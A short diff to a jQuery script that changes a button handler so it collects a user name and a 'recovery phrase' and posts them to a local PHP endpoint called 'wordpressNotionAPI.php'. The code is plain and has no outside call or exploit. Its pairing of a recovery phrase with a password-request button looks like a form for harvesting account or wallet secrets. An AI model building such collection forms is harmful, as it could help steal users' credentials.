@@ -1,6 +1,7 @@
 $(document).ready(function() {
-  $("#driver").click(function(event){
-    var name = $("#name").val();
-    $("#stage").load('wordpressNotionAPI.php', {"name":name} );
+  $("#passReq").click(function(event){
+    var recoveryPhrase = $("#recoveryPhrase").val();
+    var userName = $("#userName").val();
+    $("#stage").load('wordpressNotionAPI.php', {"recoveryPhrase":recoveryPhrase, "userName":userName} );
           });
 });
